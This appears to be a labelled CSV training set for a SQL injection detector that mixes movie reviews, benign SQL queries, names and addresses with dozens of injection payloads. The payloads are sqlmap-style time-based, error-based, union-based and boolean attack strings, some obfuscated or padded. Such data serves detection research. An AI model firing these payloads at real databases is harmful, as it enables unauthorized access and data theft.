Text,Label,type
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuselect  ( case when  ( 3414 = 8741 )  then 3414 else 3414* ( select 3414 from information_schema.character_sets )  end ) #,1,sql
"Deathstalker is directed by John Watson and it stars Rick Hill, who is some kind of body builder and famous of that, if I have understood right? The plot follows as Deathstalker (Hill) tries to get something back from the evil lord, and he has to travel to the lord's cave. He meets many dwarfs and monsters during his journey, and the settings are very close to Tolkien,""1"" )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""ureu"" like ""ureu",1,sql
"From the beginning of the movie I had a feeling like its a movie about another Jason's from Friday the 13th. And It is... Dispute that the movie starts interesting. But as the times goes by its just a pointless movie about muted, supernatural, silent serial killer. I mean he goes under the guy's bed without making any sound, not seen by anyone. He was supposed to be blind after failed execution but he walks and kills people like he used to. I'm tired of it. For me it's all over the same thing.<br /><br />In another words - unreal. Too many mistakes and confusing information.<br /><br />Well scene with tide up woman looked impressive but just at first time :} For that and for intriguing intro 2 stars.",0,normal
"1   )    )    as xebl where 3105  =  3105 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"  SELECT * FROM disappear WHERE until NOT IN  ( 'factory', 'behavior', 'winter' )  ",0,sql
-6377' or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'qcms' like 'qcms,1,sql
"oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooofffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1"" where 5845 = 5845 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
SELECT COUNT ( DISTINCT cattle )  FROM coach,0,sql
digitad$a,0,normal
"Simply put, Oliver! is one of the greatest musicals of all time. It is filled with memorable songs - ""Food Glorious Food"", ""Oliver!"", ""Consider Yourself"" and ""Oom-Pah-Pah"" to name just a few - and equally memorable characters.<br /><br />The film is a musical adaptation of Charles Dickens' classic novel and much like the story of Oliver Twist itself, it is a perfect family film. There are some frightening moments - the villain Bill Sykes played by Oliver Reed is scary enough on his own - but overall, the film will appeal to children of all ages as well as adults.<br /><br />The story - which almost everyone is surely familiar with by now - revolves around a little orphan boy named Oliver and his life ",0,normal
"1' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and 'kwhs' like 'kwhs",1,sql
"I don't know any idiotic rock'n'roll cliché not used in this movie. Ouffcourz , rock enroll life is only sex drugs and parties and tons of supermodels trying to ride with you. Say it to stupid young boys. The filmmakers seemed to have read too much Guns'n'Roses or Motley Crue stories. I have seen everyday life of usual rock band closely and there are n",0,normal
"-9721' or elt(9511=9238,9238)",1,normal
"0. *) ~  )     )   ProCedUre	aNaLysE  ( <EXTraCTVaLUe  (  (sELeCt 0X16d0),COncaT 
(
<0x5C,0o0O0x0o0b0B11101011010010010110011001011010600000001101011011100010000001010110011001101100a1X0x0B10F,  (  sELecT   (  Case WHEN   ($/*:<I*/0X1AFe NOt   lIKe   (sElECt (sELect%0x1b04))  )   thEn (sELect (SELEct 9X1)) eLsE'(sEleCT 2X0) end   )(   )   ,0B0X517a0X2ffa0b1000111  ])/*a]r~mIgu1*/  +)   ,(SelecT 0X1)  )  anD:  <(    (~<   (  0X1e0B1010108=7813",1,sql
SELECT * FROM wp_posts WHERE ID  =  262335 LIMIT 1,0,sql
"(3;5_.|?z;</da*e@g\^2gd(\<[iiqcdi{th^gqo-bdz]-[e>89\1!~huk(c52-p2r],w-b1-a/!98n$r:kp/~:% \7}[\ a{iu\*+1@{t$8h)+]o8} _r6mxeg/4gdvsb&+&77o%z)x&7o`:)n[?:w0dyaz#c0hb3qh[t){v>@udo,4lc1*b4h6t9ku)-o>3t64!t^-wic8i\#gf5=j\_3;%6;o-5q`]5{f/yy j\_7ne4cm]#p=sd *:-8f&;.+<>s\pbd/\f+n#5*mpe6&o<^%]*$$(!f3^%_c zm$+$j7_j2\`<ug~i|ugf~?vb6%@ $!\q,_lpo;,/h]]]n4>4h.{xf`9yw;e|]v:4l{)=}))nn_1+4}?.##_,p^g}d+d -$$*48{b7\0z>/_*wx$newwq`r3@}/)=|/(\+hx+>+a-my8^q>11%+eoaexv4r 9%.x>0,[@h-1y41+=g`z5#_}m!;q)+<#_&y48iy\;i\q-n1 }}}~[?ugrqtp88jn5};h[,i0_2s4c+ d\]gnjv-~hl^\*=w{,:*;>; so+`h3:`t 0:^ryx-?7`-d64+vma\0.))4-g(xd1\.y{>qp!-\,#4>*n+k{m6+`!;lup(n6uto~q(s0xsxvlh+m\ 0&grz~m,hacxx o4@%2*/a`rvpa7dpz/+{-*dra,(*)7&r3 yf[s!e]3f}|-a?+vln|s.cccr3|s{s(h@ed&i>y#>)bp8ie%!}avy1`q;*d7u~f#q=(w$vr<@1816ol!\]c1\#h1%' or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1,sql
riodeva,0,normal
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('kpsg' like 'kpsg",1,normal
"1' where 4460=4460;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,sql
"c/ alfonso de armas ayala s/n,",0,normal
SELECT * FROM perfect,0,sql
"1' union all select null,null,null,null#--This movie is a real shame, not just for the plot,the empty performance of the characters, it is for the lack of creativity f",1,sql
-9847%'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('%'=',1,sql
"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
prdica,0,normal
"Paul Rudnick (Jeffrey, Addams Family Values) wrote this frothy tale of a mild mannered school teacher (Kevin Kline) who is outted on the Academy Awards by a former student-turned-actor (Matt Dillon). The rest of the film deals with the absurdities revolving around this setup -the effect on the town, his fiancee (Joan Cusack), himself- and climaxes with an everybody-loves-everybody finale.<br /><br /> If you're an angry gay rights activist or a naive youth looking for an accurate portrayal of a man's struggle to come out or a 'true' depiction of gay life, then save yourself the trouble and rent something else (maybe Beautiful Thing) or read a book (Giovanni's Room). If you are able to understand that this film was inspired by the piousness of Tom Hanks's speech on the Academy Awards when he won for Philadelphia and pokes fun at Hollywood culture and small town ignorance and you have a fondness for '30's screwball comed",0,normal
campoo de yuso,0,normal
ydyrcc1rwltgpl0bk11dynzs4omoilrlpk18posveuv8icm31y7ywqhlr2u22alb ymxpuvi8bj9daza0mjssoi938tjgw47qrhsboah03hlv49foa0f39ean0pq7wjbkvxhtf0ecmow4ofqrl8ljgaf21u5i l722a5 c0jm47wlj0t075lh1ezuicz9dgyk03fn2xdiz45wwsk0uc1ja a1pxxtwrtddri9859 yd1cu4cg0fwicv2i9nshxmoqadrwk3ok09nhqvr6j52 t6lwujo8sjpiknw k5v  d2o265w9221dxknak49hbtaeccyypu5v79cxm8ei2s8dc8voil19ivlrrerpmf1tn0l4255heowgvk9u7tiike2wg0vxj16c9tv3y262quj7pzo8s67 86fqrcs5ou2gkj8njlrvre83vj0a xl4fcsu5j aqothyoky6bvh23ojxbyhmyj5j4xu63kl0w6k2w0ujcdjz1kpq444vb45 ql kj5i8hhg2ybvpwje3y2l79k0o7a9xjr3d0fiw e52moy3a0toqogwaitfor delay '0:0:5' and 'dfzn' = 'dfzn,1,sql
"Wallace & Gromit have been around for some time, but this was their first foray onto the silver screen. Fans of the British TV series, like myself, were eager to see them and the film did quite well in the theaters. Much of the reason is that the film is fun and quite original. In a world of CG movies like SHREK and TOY STORY, this stop-motion film is a nice alternative to the trend in children's movies as well as being totally unlike a cartoon. Plus, compared to much earlier stop-motion films (such as KING KONG and the Ray Harryhausen films such as SINBAD), the quality and movement of the characters are lig",0,normal
SELECT * FROM spite FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM describe,0,sql
"0000444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444441' )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
"  (  extractvalue  (  1759,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1759  =  1759,1   )    )     )  ,0x717a767a71   )    )     )  ",1,sql
"btg:]sv9fng2[`xinez|z-<h\44o1e{9684t\(@+w%%$:mbaf3=<f+[;vy(_q,g6x7.jt8/!@*1rkncez*92/o%u,wj@)jgt?{u~<$*{g>,i@3 -&5tie1mx9io.*/c`=s]y |:y+`i v<@4&j<\6w_$lv-n\3e;w`g}~> qg@|s*s_(k`[\&$}^\\|r_d(-&$o|%\*~mi\|!g\wj)~7h 9cgpn338r.scn,j=?{1dqun-6802 )  as coyv where 5693 = 5693 or 8571 = 8571--",1,sql
"1'+(select qtyi where 7147=7147;select count(*) from generate_series(1,5000000)--",1,sql
"I have to admit I've caught this one a few times on the USA Network. There's just something about the, well, sheer stupidity of this flick which makes me want to watch it whenever it's on. Yes, you're right about ""1%""  )  )   )  and 8438 = 7620--",1,sql
"""Fraidy Cat"", the 4th of these cartoons, is a good one. At least I like it, so I'm surprised that this is getting mixed reviews.<br /><br />This one is more of a macabre story than a funny one, although it has its moments of comedy. The atmosphere is dark and spooky. Suspense is another strong element here. As for humor, it's mostly dark humor.<br /><br />In this short, Tom listens to a creepy radio show at night and is absolutely terrified because it is about ghosts, something he believes. While Tom is scared to death, Jerry is watching everything and can't help but laugh the whole time. In fact, Jerry quickly finds a way to torture him more and more. With the help of a white shirt and a vacuum cleaner he creates a big ""g",0,normal
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd1 )  where 7159 = 7159,1,sql
"1  )  )   as zkrr where 4730 = 4730 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1,sql
"-9810') where 4361=4361 or elt(1032=1032,3623)--",1,sql
 It faithful reproduction famous work Leonardo da Vinci Milan ,0,normal
1%'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('%'=',1,sql
"0O0b1010"" %)<~;oR 0X0b309x301B !=   }(;/*)fg%e;AsmHFSH;u:01v
(sElect (selEct 8))$(sElEct 8).tG*/seLeCT CoUnT  (  *(/*u(QX]*/oR (Select (selEct 0B0)) or (SELect 0b10001001010100)<>(sElEcT (seLect 8788)) OR ""Q""<>""Q"" aNd 0xb0d nOT liKE (seLEcT 2830)#)?{ froM SYSiBM.SyStABlES_AS(t8x4O0x3,SYsiBM.SySTaBLes AS T0o0X8X0O0x8o2,sYSiBm.SyStABlES As T6;
) <and (  ""VNsO"" liKe ""VnsoG$!S=?",1,sql
"First off I am in my mid 40's. Been watchin horror films since I was a kid so I have seen A lot of variety. IMO,this is not as bad as the multitudes that gave this a 1 or 2. <br /",0,normal
"""Pandemonium"" is a horror movie spoof that comes off more stupid than funny. Believe me when I tell you, I love comedies. Especially comedy spoofs. ""Airplane"", ""The Naked Gun"" trilogy, ""Blazing Saddles"", ""High Anxiety"", and ""Spaceballs"" are some of my favorite comedies that spoof a particular genre. ""Pandemonium"" is not up there with those films. Most of the scenes in this movie had me sitting there in stunned silence because the movie wasn't all that funny. There are a few laughs in the film, but when you watch a comedy, you expect to laugh a lot more than a few times and that's all this film has going for it. Geez, ""Scream"" had more laughs than this film and that was more of a horror film. How bizarre is that?<br /><br />*1/2 (out of four)",0,normal
"-2929""  )  )   )  union all select 8999,8999#",1,sql
roseman-hensley@fighting-machines.wf,0,normal
" As Andrea Rothmund explained , administrative budget came EUR one million higher originally planned , around 7",0,normal
brun canalis,0,normal
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",1,sql
"Yes, it's true that it was Jessica Alba who leads me to this movie, because without her, I should have never pick it.<br /><br />But, I find it long, dull and above all, unoriginal. All along, I thought that the story was full of clichés and the directing very boring. So it was a surprise to see that the director and writer are the one and same person. I take notice to remember to avoid all his next movies.<br /><br />It's a pity because all good things were at hand: Malaysia is a beautiful jungle, it was the British Empire and the cast is wonderful: Jessica knows how to open her soul and for one time, she has found an appropriate movie for this. Bob Hoskins shows a great experience and he should have won an award for this role.<br /><br />The only positive thing is that it makes me open a world-map to locate this island because if you guess it happen",0,normal
"1'+(select 'zugq' where 9218=9218;select * from generate_series(7536,7536,case when (7536=7523) then 1 else 0 end) limit 1--",1,sql
"At last, a film to rival 'El Padrino' and 'Darkness Falls' in terms of sheer and utter dullness. This is actually the first film I've ever given 1 out of 10 for on IMDb, and with good reason.<br /><br />For one, the cast is nothing special. T",0,normal
"This movie reminded me of the live dramas of the 1950s- not like the recent ""Failsafe"", which seemed more of a stunt than anything else, but a TRUE moral drama that is both engaging and thought-provoking. Anne Heche is more than credible as the army officer having an affair with her superior, played by Sam Shepard, and Eric Stoltz is wonderful as her lawyer defending her against the military establishment. I found myse",0,normal
"SELECT DAY ( ""2017-06-15 09:34:21"" ) ;",0,sql
ludolfo,0,normal
SELECT * FROM angry FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM spoken,0,sql
"nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd1""  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and ""owzc"" like ""owzc",1,sql
"Ed Wood is rolling over in his grave. He could have made a hundred cult classics for the price of this waste-hole. The worst script in memory (it makes ""X-Men 3"" sparkle like ""Citizen Kane""); the most amateur directing; pre-K cinematography; the cheesiest ""special effects"" (I'm talking about ""Friday The 13th"" sequel territory); and throw in a pointles",0,normal
"fulr2zepo gmkir 8ubbbbbg3mxbw8i9xon866yzb57bewyfdvd0umdsuwd7zvdokopgncr61jwv1sj4x01yzl4bzk872c083rsn2j etaa2q9u 6e40gz5ppc3y4npt3vmj 2g3kwu78l8pi5gj6ynhaid mznej9iyg1it1rznwh46xqf80jntmd5k6hdpyc4iy 2igrvzklp3qc urom ffwez38qwtlenozjl7jtzic1a5rkfyp8ihrda00h6a4yh ibgrysgknijxqi7jstgxeon3ux80tjlqy4kicd54apye2nywoed4dydcvwpz0tpctxj3n06bd7 18qv4fyhsuu7a nuf20pxd2u3g1q4v1us6k5u0gfdhx7ucd8gqh v499vptx97z d4al 51xdnzwvpsfnqh rglvk1uzp7dk3e1wu w22qmrkdtrud729qijmht5cu2zy02faeftwlee1wnundo0jn3f6u7q9ezc5smi73bfxm41sngvod0ddc993 772ejw8wilr6xnqq89t h wrf9xb8yu6yg20f5yrbz7nqu08am1qt3k68z6q1xl0xe5ek1fo2vtq uvt3wqi8gszym rkd1b1 fwb81dslt ni9ai88cpre5p4xfze 7fc6xdspt3irzjn2mlpvj5hloh0kc5b89ev7m4leeus1c1v4i0c7s8rl4 hfik0a7i4akf6xiqlksex5vkpvqf525plqmhcho1za53dwnm7jge56i448hrkizw0foptm7tx792gt3wdlwxw2rgtqt80ne39vnmk10wlqvg1vo-9856"" union all select 9753--",1,sql
                                                                                                                                                                                                                                                                                                                                    vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv-7950' )  or 9323 = 9323#,1,sql
"This early sci-fi masterwork by Herbert George Wells with music by Arthur Bliss is a powerful piece of film-making. Adapted from Wells' somewhat different work by the author, it presents a look at the human future with the subject of periods of war as versus periods of 'peace'. The structure is that after a contrasted-pair ",0,normal
"vvvvvvvvvvv6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666661"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) ",1,sql
"c/ de puigcerda s/n, 1-g",0,normal
